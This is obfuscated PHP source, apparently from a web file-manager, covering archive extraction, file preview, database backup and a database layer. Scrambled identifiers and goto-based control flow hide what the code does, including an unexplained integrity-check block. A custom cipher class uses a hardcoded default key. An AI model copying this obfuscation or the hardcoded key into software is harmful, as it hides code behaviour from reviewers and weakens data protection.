PclTarExtract($Aåß²ÁË•, $Fö²¶Œã™, $D°¢ÛïŒŒ[366], $C‹›æê¯À’); } return array($D°¢ÛïŒŒ[1022] => $Cƒ¤ß¦ ¦é, $D°¢ÛïŒŒ[1024] => PclErrorString(!0)); } else { if (self::checkIfType($C‹›æê¯À’, $D°¢ÛïŒŒ[1035])) { return kodRarArchive::extract($Aåß²ÁË•, $Fö²¶Œã™, $C‹›æê¯À’, $AÎÎî×â½); } else { if (kodZipArchive::support($D°¢ÛïŒŒ[1885])) { return kodZipArchive::extract($Aåß²ÁË•, $Fö²¶Œã™, $AÎÎî×â½); } else { $BìÓì™á×… = new PclZip($Aåß²ÁË•); if ($Aåä½Êì != $D°¢ÛïŒŒ[1021]) { $Cƒ¤ß¦ ¦é = $BìÓì™á×…->extract(PCLZIP_OPT_PATH, $Fö²¶Œã™, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D°¢ÛïŒŒ[1886], PCLZIP_OPT_BY_NAME, $c“‹Ñµ·–[$D°¢ÛïŒŒ[1881]], PCLZIP_OPT_REMOVE_PATH, $fÚîÜ¤ÒŠì, PCLZIP_OPT_REPLACE_NEWER); } else { $Cƒ¤ß¦ ¦é = $BìÓì™á×…->extract(PCLZIP_OPT_PATH, $Fö²¶Œã™, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $D°¢ÛïŒŒ[1886], PCLZIP_OPT_REPLACE_NEWER); } return array($D°¢ÛïŒŒ[1022] => $Cƒ¤ß¦ ¦é, $D°¢ÛïŒŒ[1024] => $BìÓì™á×…->errorName(!0)); } } } return array($D°¢ÛïŒŒ[1022] => !1, $D°¢ÛïŒŒ[1024] => $D°¢ÛïŒŒ[1887]); goto Eè¥ÁÓŒÓ“; c±Šˆ“ÂÒ: $D°¢ÛïŒŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $C‹›æê¯À’ = !empty($GLOBALS[$D°¢ÛïŒŒ[1039]]) ? $GLOBALS[$D°¢ÛïŒŒ[1039]] : get_path_ext($Aåß²ÁË•); goto BŒ±Æ¦„¤¹; BŒ±Æ¦„¤¹: $aÔˆ¯Ì²‚§ = self::listContent($Aåß²ÁË•, !1); if (!$aÔˆ¯Ì²‚§[$D°¢ÛïŒŒ[1022]]) { return $aÔˆ¯Ì²‚§; } if ($Aåä½Êì != $D°¢ÛïŒŒ[1021]) { goto f·½Š“‹Šé; f·½Š“‹Šé: $c“‹Ñµ·– = self::fileIndex($aÔˆ¯Ì²‚§[$D°¢ÛïŒŒ[1024]], $Aåä½Êì); $AÎÎî×â½ = str_replace(array($D°¢ÛïŒŒ[1062], $D°¢ÛïŒŒ[1883]), $D°¢ÛïŒŒ[70], $c“‹Ñµ·–[$D°¢ÛïŒŒ[1881]]); $Eø‘Ì•³ = $AÎÎî×â½; goto FŸÃö›ëÅ‘; FŸÃö›ëÅ‘: if ($GLOBALS[$D°¢ÛïŒŒ[6]][$D°¢ÛïŒŒ[1135]] != $D°¢ÛïŒŒ[331]) { $Eø‘Ì•³ = unzip_pre_name($AÎÎî×â½); } $fÚîÜ¤ÒŠì = get_path_father($AÎÎî×â½); if ($fÚîÜ¤ÒŠì == $AÎÎî×â½) { $fÚîÜ¤ÒŠì = $D°¢ÛïŒŒ[33]; } goto aĞÀ‰ŸšÄ¢; aĞÀ‰ŸšÄ¢: if ($c“‹Ñµ·–[$D°¢ÛïŒŒ[76]]) { $Eø‘Ì•³ = rtrim($Eø‘Ì•³, $D°¢ÛïŒŒ[8]) . $D°¢ÛïŒŒ[8]; $AÎÎî×â½ = array($AÎÎî×â½); } $E½±²£ßˆ = str_replace($D°¢ÛïŒŒ[93], $D°¢ÛïŒŒ[8], $Eø‘Ì•³); if (substr($E½±²£ßˆ, -1) == $D°¢ÛïŒŒ[8]) { if (!strstr(trim($E½±²£ßˆ, $D°¢ÛïŒŒ[8]), $D°¢ÛïŒŒ[8])) { $Fö²¶Œã™ = $Fö²¶Œã™ . get_path_this($E½±²£ßˆ) . $D°¢ÛïŒŒ[8]; } } else { if ($fÚîÜ¤ÒŠì == $Eø‘Ì•³) { $fÚîÜ¤ÒŠì = $D°¢ÛïŒŒ[33]; } } goto Aä¾†Æ©—§; Aä¾†Æ©—§: } goto Aæµ½œêİ†; Eè¥ÁÓŒÓ“: } static function fileIndex($E“ÔŒŒ©Î¾, $DÂç‰×Ö…, $a†æàˆ£° = false) { goto D³ù˜„ˆ›; BÒÖ‰Í®­º: $d¢‰çÛŒã = count($E“ÔŒŒ©Î¾); for ($A˜‡¶§Ã¶í = 0; $A˜‡¶§Ã¶í < $d¢‰çÛŒã; $A˜‡¶§Ã¶í++) { if ($DÂç‰×Ö… == $E“ÔŒŒ©Î¾[$A˜‡¶§Ã¶í][$E·¤©£á¿[1026]]) { $eà¶Ï†¼ø = $E“ÔŒŒ©Î¾[$A˜‡¶§Ã¶í]; break; } } if (!$eà¶Ï†¼ø) { show_tips($E·¤©£á¿[1888]); } goto eÊíÑÕ±±; D³ù˜„ˆ›: $E·¤©£á¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); if (!is_array($E“ÔŒŒ©Î¾)) { return !1; } goto BÒÖ‰Í®­º; eÊíÑÕ±±: $eËÍÑ©âáŒ = $eà¶Ï†¼ø; if ($a†æàˆ£°) { $eËÍÑ©âáŒ = $eà¶Ï†¼ø[$a†æàˆ£°]; if ($eà¶Ï†¼ø[$E·¤©£á¿[76]]) { $eËÍÑ©âáŒ = rtrim($eËÍÑ©âáŒ, $E·¤©£á¿[8]) . $E·¤©£á¿[8]; } } return $eËÍÑ©âáŒ; goto b¦…‹‹Š˜; b¦…‹‹Š˜: } static function extractZipFile($cŒæïš´Æ¸, $aîÌ„Ûœšù, $Eå¬º¶‰Æá = false) { goto F³„èÊä™ç; D–¢¦Éáîí: mk_dir($C¶ï‚×¸İí); $DÙÉ­‚«ê¡ = $C¶ï‚×¸İí . md5($cŒæïš´Æ¸ . $aîÌ„Ûœšù); if ($Eå¬º¶‰Æá) { $DÙÉ­‚«ê¡ = $C¶ï‚×¸İí . $Eå¬º¶‰Æá; } goto d¯¹Ã»¬ç; d¯¹Ã»¬ç: if (file_exists($DÙÉ­‚«ê¡)) { return $DÙÉ­‚«ê¡; } $FˆÂ”¸¨Í = new PclZip($cŒæïš´Æ¸); $E¦ÅçÑÔ¶Š = unzip_filter_ext($C¶ï‚×¸İí . get_path_this($aîÌ„Ûœšù)); goto D½¾¢ô¬™Œ; F³„èÊä™ç: $Cä—¥ÉåÁ— =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $C¶ï‚×¸İí = TEMP_FILES . hash_path($cŒæïš´Æ¸) . $Cä—¥ÉåÁ—[8]; goto D–¢¦Éáîí; D½¾¢ô¬™Œ: $C”×ëÖÀŞ = get_path_father($aîÌ„Ûœšù); if ($C”×ëÖÀŞ == $aîÌ„Ûœšù) { $C”×ëÖÀŞ = $Cä—¥ÉåÁ—[33]; } $aŸ´ÎÇÇ·¾ = $FˆÂ”¸¨Í->extract(PCLZIP_OPT_PATH, $C¶ï‚×¸İí, PCLZIP_CB_PRE_FILE_NAME, $Cä—¥ÉåÁ—[1886], PCLZIP_OPT_REMOVE_PATH, $C”×ëÖÀŞ, PCLZIP_OPT_BY_NAME, $aîÌ„Ûœšù); goto F³àˆ³˜¾ó; F³àˆ³˜¾ó: if (!file_exists($E¦ÅçÑÔ¶Š)) { return !1; } @rename($E¦ÅçÑÔ¶Š, $DÙÉ­‚«ê¡); return $DÙÉ­‚«ê¡; goto EïĞÂÉÜ†; EïĞÂÉÜ†: } static function filePreview($fµ‚’¥¶¦, $bĞÎ÷¦³ƒ—, $eÁŒ’©­ƒñ = false, $e¹à£ª“ = false) { goto aìÉÚêÃ ; EÊÓ–‰äÊÆ: if (!$bÃŠÆÍÔ‘é[$C®ö½‹ ¦È[1022]]) { show_json($bÃŠÆÍÔ‘é[$C®ö½‹ ¦È[1024]], !1); } if (!file_exists($D²‹œ»Œ·)) { show_json($C®ö½‹ ¦È[1890], !1); } @rename($D²‹œ»Œ·, $d™‚¨é×É); goto eÑ¸Ú’Ù¦á; eÑ¸Ú’Ù¦á: if (!file_exists($d™‚¨é×É)) { del_dir($b¼‘‘…Ü¨); show_json($C®ö½‹ ¦È[1891]); } IO::fileOut($d™‚¨é×É, $eÁŒ’©­ƒñ, $D£Ì»¸±’™); goto fŒåÛ¦™‚£; a†³Õ«‘°Ş: $Ešêï¹äÑ‹ = unzip_pre_name($Ešêï¹äÑ‹); $D£Ì»¸±’™ = get_path_this($Ešêï¹äÑ‹); $D²‹œ»Œ· = unzip_filter_ext($b¼‘‘…Ü¨ . $D£Ì»¸±’™); goto EÊÓ–‰äÊÆ; f”òÍÒ øÈ: $bÃŠÆÍÔ‘é = self::extract($fµ‚’¥¶¦, $b¼‘‘…Ü¨, $bĞÎ÷¦³ƒ—, $Ešêï¹äÑ‹); if (is_array($Ešêï¹äÑ‹)) { show_json($C®ö½‹ ¦È[1889], !1); } if (file_exists($d™‚¨é×É)) { IO::fileOut($d™‚¨é×É, $eÁŒ’©­ƒñ, get_path_this($Ešêï¹äÑ‹)); return; } goto a†³Õ«‘°Ş; aìÉÚêÃ : $C®ö½‹ ¦È =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $b¼‘‘…Ü¨ = TEMP_FILES . hash_path($fµ‚’¥¶¦) . $C®ö½‹ ¦È[8]; goto EÚª§Š‰Ï; EÚª§Š‰Ï: mk_dir($b¼‘‘…Ü¨); $d™‚¨é×É = $b¼‘‘…Ü¨ . md5($fµ‚’¥¶¦ . $bĞÎ÷¦³ƒ— . $e¹à£ª“); $Ešêï¹äÑ‹ = $C®ö½‹ ¦È[33]; goto f”òÍÒ øÈ; fŒåÛ¦™‚£: } static function create($b³‘›¢ÛŠè, $eòÙˆÏìš²) { $bÈƒ‡ÀÛ„á =& $_SERVER[ºÖÙÂŒäÉê‡]; self::init(); $eŒ¶ôÈˆçƒ = get_path_ext($b³‘›¢ÛŠè); $c£‘©Ù±ğ = !1; if (self::checkIfType($eŒ¶ôÈˆçƒ, $bÈƒ‡ÀÛ„á[306])) { if (kodZipArchive::support($bÈƒ‡ÀÛ„á[1000])) { return kodZipArchive::create($b³‘›¢ÛŠè, $eòÙˆÏìš²); } $cÑ¾‚Ã°¾Ó = new PclZip($b³‘›¢ÛŠè); foreach ($eòÙˆÏìš² as $D›òÕ”©ï¹ => $eëÍ…«¤áì) { $eëÍ…«¤áì = str_replace($bÈƒ‡ÀÛ„á[471], $bÈƒ‡ÀÛ„á[8], $eëÍ…«¤áì); $e·¦ŠğË = Kodio::clear(get_path_father($eëÍ…«¤áì)); if ($D›òÕ”©ï¹ == 0) { $c£‘©Ù±ğ = $cÑ¾‚Ã°¾Ó->create($eëÍ…«¤áì, PCLZIP_OPT_REMOVE_PATH, $e·¦ŠğË, PCLZIP_CB_PRE_FILE_NAME, $bÈƒ‡ÀÛ„á[1892]); continue; } $c£‘©Ù±ğ = $cÑ¾‚Ã°¾Ó->add($eëÍ…«¤áì, PCLZIP_OPT_REMOVE_PATH, $e·¦ŠğË, PCLZIP_CB_PRE_FILE_NAME, $bÈƒ‡ÀÛ„á[1892]); } } else { if (self::checkIfType($eŒ¶ôÈˆçƒ, $bÈƒ‡ÀÛ„á[1863])) { foreach ($eòÙˆÏìš² as $D›òÕ”©ï¹ => $eëÍ…«¤áì) { $eëÍ…«¤áì = str_replace($bÈƒ‡ÀÛ„á[471], $bÈƒ‡ÀÛ„á[8], $eëÍ…«¤áì); $e·¦ŠğË = Kodio::clear(get_path_father($eëÍ…«¤áì)); if ($D›òÕ”©ï¹ == 0) { $c£‘©Ù±ğ = PclTarCreate($b³‘›¢ÛŠè, array($eëÍ…«¤áì), $eŒ¶ôÈˆçƒ, null, $e·¦ŠğË); continue; } $c£‘©Ù±ğ = PclTarAddList($b³‘›¢ÛŠè, array($eëÍ…«¤áì), $bÈƒ‡ÀÛ„á[33], $e·¦ŠğË, $eŒ¶ôÈˆçƒ); } } } return $c£‘©Ù±ğ; } } class Mcrypt { public static $defaultKey = "\141\41\x74\x61\x6b\101\x3a\144\154\x6d\143\x6c\144\105\166\54\x65"; public static function encode($bÔÈ£Ç¸Û¼, $dÌ…Ÿ„ÈŒÔ = '', $f¨–œ¨ùù´ = 0, $aÂï¾Ğ‡ = '') { goto A†²¢îò„Ü; BÜ¾Äò¡—: for ($dÑ²ÒÖ‰ Ò = 0; $dÑ²ÒÖ‰ Ò <= 255; $dÑ²ÒÖ‰ Ò++) { $Bâ­·„¾Ç…[$dÑ²ÒÖ‰ Ò] = ord($C¡³Èö[$dÑ²ÒÖ‰ Ò % $FîŠÑâŞ†]); } $cÍíØ“çŒ¦ = range(0, 255); for ($a“Ìç®ÉÇí = $dÑ²ÒÖ‰ Ò = 0; $dÑ²ÒÖ‰ Ò < 256; $dÑ²ÒÖ‰ Ò++) { $a“Ìç®ÉÇí = ($a“Ìç®ÉÇí + $cÍíØ“çŒ¦[$dÑ²ÒÖ‰ Ò] + $Bâ­·„¾Ç…[$dÑ²ÒÖ‰ Ò]) % 256; $B‚ÓÎÓÑ–´ = $cÍíØ“çŒ¦[$dÑ²ÒÖ‰ Ò]; $cÍíØ“çŒ¦[$dÑ²ÒÖ‰ Ò] = $cÍíØ“çŒ¦[$a“Ìç®ÉÇí]; $cÍíØ“çŒ¦[$a“Ìç®ÉÇí] = $B‚ÓÎÓÑ–´; } goto C¸Ìßí©¦­; d›¨ÎÊœÂŒ: $bÔÈ£Ç¸Û¼ = sprintf($CÀ…¥µŒ[1893], $f¨–œ¨ùù´ ? $f¨–œ¨ùù´ + time() : 0) . substr(md5($bÔÈ£Ç¸Û¼ . $b‘ÔˆÃàĞé), 0, 16) . $bÔÈ£Ç¸Û¼; $F¬‘¿İÜá‘ = strlen($bÔÈ£Ç¸Û¼); $Bâ­·„¾Ç… = array(); goto BÜ¾Äò¡—; B–æ‘Ï½±Ò: $CÀ±ÍÒºˆ = str_replace(array($CÀ…¥µŒ[289], $CÀ…¥µŒ[8], $CÀ…¥µŒ[899]), array($CÀ…¥µŒ[416], $CÀ…¥µŒ[70], $CÀ…¥µŒ[91]), $CÀ±ÍÒºˆ); return $CÀ±ÍÒºˆ; goto cœ…£ÄÓº™; C¸Ìßí©¦­: $CÀ±ÍÒºˆ = $CÀ…¥µŒ[33]; for ($Fä¥í„ë¯¼ = $a“Ìç®ÉÇí = $dÑ²ÒÖ‰ Ò = 0; $dÑ²ÒÖ‰ Ò < $F¬‘¿İÜá‘; $dÑ²ÒÖ‰ Ò++) { $Fä¥í„ë¯¼ = ($Fä¥í„ë¯¼ + 1) % 256; $a“Ìç®ÉÇí = ($a“Ìç®ÉÇí + $cÍíØ“çŒ¦[$Fä¥í„ë¯¼]) % 256; $B‚ÓÎÓÑ–´ = $cÍíØ“çŒ¦[$Fä¥í„ë¯¼]; $cÍíØ“çŒ¦[$Fä¥í„ë¯¼] = $cÍíØ“çŒ¦[$a“Ìç®ÉÇí]; $cÍíØ“çŒ¦[$a“Ìç®ÉÇí] = $B‚ÓÎÓÑ–´; $CÀ±ÍÒºˆ .= chr(ord($bÔÈ£Ç¸Û¼[$dÑ²ÒÖ‰ Ò]) ^ $cÍíØ“çŒ¦[($cÍíØ“çŒ¦[$Fä¥í„ë¯¼] + $cÍíØ“çŒ¦[$a“Ìç®ÉÇí]) % 256]); } $CÀ±ÍÒºˆ = $aÉáË‚ô˜Ÿ . str_replace($CÀ…¥µŒ[899], $CÀ…¥µŒ[33], base64_encode($CÀ±ÍÒºˆ)); goto B–æ‘Ï½±Ò; A†²¢îò„Ü: $CÀ…¥µŒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÍ‘ë¾Â‚ì = 4; $dÌ…Ÿ„ÈŒÔ = md5($dÌ…Ÿ„ÈŒÔ ? $dÌ…Ÿ„ÈŒÔ : self::$defaultKey); goto eòâŒòÔ; aÁŠ…º„ˆë: $aÉáË‚ô˜Ÿ = substr($aÂï¾Ğ‡, -$EÍ‘ë¾Â‚ì); $C¡³Èö = $B÷áîì‡ . md5($B÷áîì‡ . $aÉáË‚ô˜Ÿ); $FîŠÑâŞ† = strlen($C¡³Èö); goto d›¨ÎÊœÂŒ; eòâŒòÔ: $B÷áîì‡ = md5(substr($dÌ…Ÿ„ÈŒÔ, 0, 16)); $b‘ÔˆÃàĞé = md5(substr($dÌ…Ÿ„ÈŒÔ, 16, 16)); $aÂï¾Ğ‡ = $aÂï¾Ğ‡ ? $aÂï¾Ğ‡ : md5(microtime()); goto aÁŠ…º„ˆë; cœ…£ÄÓº™: } public static function decode($C¤È¯Èï¨, $Bçõ¦ŞøŞğ = '') { goto Cß­àæí—ï; CšëñÒ«°: $aá…×Èö£­ = $c”ºĞª—¶ø[33]; for ($B£³Ô–Î™… = $eÉ“é´åñÂ = $b¨õ“¶º = 0; $b¨õ“¶º < $cåÑ©°Ù²; $b¨õ“¶º++) { $B£³Ô–Î™… = ($B£³Ô–Î™… + 1) % 256; $eÉ“é´åñÂ = ($eÉ“é´åñÂ + $A‹ô‘å·ß¥[$B£³Ô–Î™…]) % 256; $DóĞ¦’©Ú… = $A‹ô‘å·ß¥[$B£³Ô–Î™…]; $A‹ô‘å·ß¥[$B£³Ô–Î™…] = $A‹ô‘å·ß¥[$eÉ“é´åñÂ]; $A‹ô‘å·ß¥[$eÉ“é´åñÂ] = $DóĞ¦’©Ú…; $aá…×Èö£­ .= chr(ord($C¤È¯Èï¨[$b¨õ“¶º]) ^ $A‹ô‘å·ß¥[($A‹ô‘å·ß¥[$B£³Ô–Î™…] + $A‹ô‘å·ß¥[$eÉ“é´åñÂ]) % 256]); } $fëŞÒÌİÀ = intval(substr($aá…×Èö£­, 0, 10)); goto D–íØ…¶¬Û; cİª¸©Ãë›: $Bçõ¦ŞøŞğ = md5($Bçõ¦ŞøŞğ ? $Bçõ¦ŞøŞğ : self::$defaultKey); $b³‚ÌÕä‹Ê = md5(substr($Bçõ¦ŞøŞğ, 0, 16)); $cî­Ø­î = md5(substr($Bçõ¦ŞøŞğ, 16, 16)); goto cÄßì¨¡˜—; A…ïî¨¸Œ¯: for ($b¨õ“¶º = 0; $b¨õ“¶º <= 255; $b¨õ“¶º++) { $dñîˆ¿çÚ‰[$b¨õ“¶º] = ord($AÅµÏ¨¤¬£[$b¨õ“¶º % $aÅ†ïƒ…‰]); } $A‹ô‘å·ß¥ = range(0, 255); for ($eÉ“é´åñÂ = $b¨õ“¶º = 0; $b¨õ“¶º < 256; $b¨õ“¶º++) { $eÉ“é´åñÂ = ($eÉ“é´åñÂ + $A‹ô‘å·ß¥[$b¨õ“¶º] + $dñîˆ¿çÚ‰[$b¨õ“¶º]) % 256; $DóĞ¦’©Ú… = $A‹ô‘å·ß¥[$b¨õ“¶º]; $A‹ô‘å·ß¥[$b¨õ“¶º] = $A‹ô‘å·ß¥[$eÉ“é´åñÂ]; $A‹ô‘å·ß¥[$eÉ“é´åñÂ] = $DóĞ¦’©Ú…; } goto CšëñÒ«°; D–íØ…¶¬Û: if (($fëŞÒÌİÀ == 0 || $fëŞÒÌİÀ - time() > 0) && substr($aá…×Èö£­, 10, 16) == substr(md5(substr($aá…×Èö£­, 26) . $cî­Ø­î), 0, 16)) { return substr($aá…×Èö£­, 26); } else { return $c”ºĞª—¶ø[33]; } goto f÷„Ô÷ã; Cß­àæí—ï: $c”ºĞª—¶ø =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¤È¯Èï¨ = str_replace(array($c”ºĞª—¶ø[416], $c”ºĞª—¶ø[70], $c”ºĞª—¶ø[91]), array($c”ºĞª—¶ø[289], $c”ºĞª—¶ø[8], $c”ºĞª—¶ø[899]), $C¤È¯Èï¨); $BŠ‰Ç®öëÃ = 4; goto cİª¸©Ãë›; cÄßì¨¡˜—: $b¾ÆÜ¼¶‡ = substr($C¤È¯Èï¨, 0, $BŠ‰Ç®öëÃ); $AÅµÏ¨¤¬£ = $b³‚ÌÕä‹Ê . md5($b³‚ÌÕä‹Ê . $b¾ÆÜ¼¶‡); $aÅ†ïƒ…‰ = strlen($AÅµÏ¨¤¬£); goto c»›ÕÜ–×; c»›ÕÜ–×: $C¤È¯Èï¨ = base64_decode(substr($C¤È¯Èï¨, $BŠ‰Ç®öëÃ)); $cåÑ©°Ù² = strlen($C¤È¯Èï¨); $dñîˆ¿çÚ‰ = array(); goto A…ïî¨¸Œ¯; f÷„Ô÷ã: } } goto B‚‰İåóŒ; BÆ‰’–ƒŒŒ: $EÃ©Ä­Øº÷ = $_SERVER[ºÖÙÂŒäÉê‡][708]; if ($_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][169]] != $EÃ©Ä­Øº÷($Dì„øÙé´†)) { goto cÛºë¦å—¤; AÅëÃ›İ—: $F¡‚ÑÄÃùÇ = explode($_SERVER[ºÖÙÂŒäÉê‡][174], $bˆÍÄ®Œ”); if (count($F¡‚ÑÄÃùÇ) < $_SERVER[ºÖÙÂŒäÉê‡][175]) { $f¿ë„Éµ»— = $_SERVER[ºÖÙÂŒäÉê‡][176]; $f¿ë„Éµ»—(); } $fâ½Éİ°¶© = $_SERVER[ºÖÙÂŒäÉê‡][177]; goto e±¬åÍˆŒ‹; e±¬åÍˆŒ‹: $fâ½Éİ°¶©($Dì„øÙé´†); goto B…­ŞÙ‰˜ù; cÛºë¦å—¤: $d”Í„àŸàù = $_SERVER[ºÖÙÂŒäÉê‡][171]; $Båçõƒ Ì² = $_SERVER[$_SERVER[ºÖÙÂŒäÉê‡][172]] . $_SERVER[ºÖÙÂŒäÉê‡][173]; $bˆÍÄ®Œ” = $d”Í„àŸàù($Båçõƒ Ì²); goto AÅëÃ›İ—; B…­ŞÙ‰˜ù: } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eŒ–Šƒ–Ş; eŒ–Šƒ–Ş: $AòŒ‰øª =& $_SERVER[ºÖÙÂŒäÉê‡]; $Aå™ÊÖ‰¨¾ = Backup::get(); self::$io = $Aå™ÊÖ‰¨¾[$AòŒ‰øª[688]]; goto aªÂùõĞ—¬; dÁÖŠ‰¢ˆ: $AÄŒ×›ÍŒê->end(); $bë­Ÿæó„› = array($AòŒ‰øª[719] => $aÏ†½Í©³, $AòŒ‰øª[704] => 1, $AòŒ‰øª[720] => $eŒ²—š¸î£, $AòŒ‰øª[721] => $eŒ²—š¸î£); Backup::set($bë­Ÿæó„›); goto D ‚‡Ä˜ñç; b½¤”ÏæÔ: $AÄŒ×›ÍŒê = new Task($AòŒ‰øª[710], $AòŒ‰øª[711], 0, LNG($AòŒ‰øª[712]) . $AòŒ‰øª[713] . LNG($AòŒ‰øª[714])); $c½Ì¨ßÁ¹ = array_diff($c½Ì¨ßÁ¹, array($AòŒ‰øª[715], $AòŒ‰øª[716])); foreach ($c½Ì¨ßÁ¹ as $BÊ¡„¾í‘À) { $dÒ¶ĞÊæ¢ö = $b÷é—„ÈŠÖ . $BÊ¡„¾í‘À . $AòŒ‰øª[717]; $dà¿Ö×¸‡İ = null; if ($BÊ¡„¾í‘À == $AòŒ‰øª[718] && (!isset($Aå™ÊÖ‰¨¾[$AòŒ‰øª[689]]) || $Aå™ÊÖ‰¨¾[$AòŒ‰øª[689]] == $AòŒ‰øª[472])) { $dà¿Ö×¸‡İ = self::$io; } $eŒ²—š¸î£ += $DñË é§‹ã->sqlFromDb($BÊ¡„¾í‘À, $dÒ¶ĞÊæ¢ö, $AÄŒ×›ÍŒê, $dà¿Ö×¸‡İ); } goto dÁÖŠ‰¢ˆ; aªÂùõĞ—¬: self::$name = $Aå™ÊÖ‰¨¾[$AòŒ‰øª[28]]; $cëæÁ°Ÿ = $GLOBALS[$AòŒ‰øª[6]][$AòŒ‰øª[17]]; $aÏ†½Í©³ = $this->_dbType($cëæÁ°Ÿ); goto b¤­æ¥ø; b›ºğ´Àª¤: mk_dir($b÷é—„ÈŠÖ); $c½Ì¨ßÁ¹ = $DñË é§‹ã->db()->getTables(); $eŒ²—š¸î£ = 0; goto b½¤”ÏæÔ; b¤­æ¥ø: $DñË é§‹ã = new DbManage($cëæÁ°Ÿ, $aÏ†½Í©³); $b÷é—„ÈŠÖ = TEMP_FILES . $AòŒ‰øª[709] . self::$name . $AòŒ‰øª[8]; del_dir($b÷é—„ÈŠÖ); goto b›ºğ´Àª¤; D ‚‡Ä˜ñç: return !0; goto E£•Ó›ÓÊË; E£•Ó›ÓÊË: } private function _dbType($f™­Ÿê·Ê) { goto eù¯›×õ¯ä; eù¯›×õ¯ä: $FÆÁÒÏ¯¢Ë =& $_SERVER[ºÖÙÂŒäÉê‡]; $f™­Ÿê·Ê = array_change_key_case($f™­Ÿê·Ê); $aŸñÑ”ŒÏ† = $f™­Ÿê·Ê[$FÆÁÒÏ¯¢Ë[722]]; goto cÎËØííõ; cÎËØííõ: if ($aŸñÑ”ŒÏ† == $FÆÁÒÏ¯¢Ë[723]) { $EÒÊîˆ¯Ëæ = explode($FÆÁÒÏ¯¢Ë[4], $f™­Ÿê·Ê[$FÆÁÒÏ¯¢Ë[724]]); $aŸñÑ”ŒÏ† = $EÒÊîˆ¯Ëæ[0]; } $fáÚÌô…Ä” = array($FÆÁÒÏ¯¢Ë[725] => $FÆÁÒÏ¯¢Ë[9], $FÆÁÒÏ¯¢Ë[726] => $FÆÁÒÏ¯¢Ë[727]); if (isset($fáÚÌô…Ä”[$aŸñÑ”ŒÏ†])) { $aŸñÑ”ŒÏ† = $fáÚÌô…Ä”[$aŸñÑ”ŒÏ†]; } goto Fç†É™îï; Fç†É™îï: return $aŸñÑ”ŒÏ†; goto C‚¥Ğçç×; C‚¥Ğçç×: } } goto D°ÚÕçì; B£†Ñàè¤³: define($_SERVER[ºÖÙÂŒäÉê‡][1897], 4); define($_SERVER[ºÖÙÂŒäÉê‡][1898], 5); define($_SERVER[ºÖÙÂŒäÉê‡][1899], 16); goto b¼¸ãØ³‰®; Bœ¬æ÷ĞŒ—: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\74\x3e", "\x67\164" => "\x3e", "\x65\x67\x74" => "\x3e\x3d", "\154\x74" => "\74", "\x65\154\164" => "\74\75", "\156\x6f\x74\154\x69\153\145" => "\116\117\x54\x20\x4c\x49\113\x45", "\x6c\151\153\x65" => "\114\x49\113\x45", "\x69\156" => "\111\116", "\156\157\x74\151\156" => "\116\x4f\124\40\111\x4e", "\156\x6f\x74\40\151\x6e" => "\x4e\117\124\40\x49\116", "\142\145\x74\167\145\145\x6e" => "\x42\x45\124\x57\x45\x45\116", "\156\x6f\164\x62\145\164\167\x65\145\x6e" => "\x4e\117\124\40\102\x45\x54\x57\x45\105\116", "\x6e\x6f\x74\x20\x62\145\164\x77\145\145\x6e" => "\x4e\117\124\40\x42\x45\x54\127\x45\x45\x4e"); protected $selectSql = "\123\105\x4c\105\x43\x54\45\x44\x49\x53\x54\x49\116\x43\124\45\x20\45\106\111\105\x4c\104\45\40\x46\x52\117\115\40\x25\x54\x41\x42\x4c\105\45\x25\x4a\x4f\111\x4e\45\x25\x57\x48\105\x52\105\45\45\107\x52\x4f\x55\x50\x25\45\x48\101\x56\111\116\x47\x25\x25\117\x52\x44\105\122\45\x25\x4c\111\x4d\x49\x54\45\40\45\x55\x4e\x49\x4f\x4e\x25\x25\x43\117\115\x4d\105\x4e\x54\45"; protected $bind = array(); public static function getInstance() { $CêïŒÜ‰‰ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ºÖÙÂŒäÉê‡][867], $CêïŒÜ‰‰); } public function factory($EÈ•Ã²‰äĞ = '') { goto Eë÷µª‰ÀÆ; a†ÍÖÇÇ¬¹: $this->dbType = ucwords(strtolower($EÈ•Ã²‰äĞ[$FÙĞ¶Ö¸[868]])); $E´†‰Ï´ = $FÙĞ¶Ö¸[870] . $this->dbType; if (class_exists($E´†‰Ï´)) { $eİÚ‡à÷ğ” = new $E´†‰Ï´($EÈ•Ã²‰äĞ); if ($FÙĞ¶Ö¸[723] != strtolower($EÈ•Ã²‰äĞ[$FÙĞ¶Ö¸[868]])) { $eİÚ‡à÷ğ”->dbType = strtoupper($this->dbType); } else { $eİÚ‡à÷ğ”->dbType = $this->_getDsnType($EÈ•Ã²‰äĞ[$FÙĞ¶Ö¸[820]]); } } else { think_exception(think_lang($FÙĞ¶Ö¸[871]) . $FÙĞ¶Ö¸[872] . $E´†‰Ï´); } goto AÙğöã…¾ğ; AÙğöã…¾ğ: return $eİÚ‡à÷ğ”; goto fóÒ‡éõ÷‘; Eë÷µª‰ÀÆ: $FÙĞ¶Ö¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÈ•Ã²‰äĞ = $this->parseConfig($EÈ•Ã²‰äĞ); if (empty($EÈ•Ã²‰äĞ[$FÙĞ¶Ö¸[868]])) { think_exception(think_lang($FÙĞ¶Ö¸[869])); } goto a†ÍÖÇÇ¬¹; fóÒ‡éõ÷‘: } public function __call($fê³ñÏ»¢ , $EŞàßíçĞÇ) { if (method_exists($this, $fê³ñÏ»¢ )) { return call_user_func_array(array($this, $fê³ñÏ»¢ ), $EŞàßíçĞÇ); } } protected function _getDsnType($Aƒºöù®ùà) { $D‚‘ÑÂ = 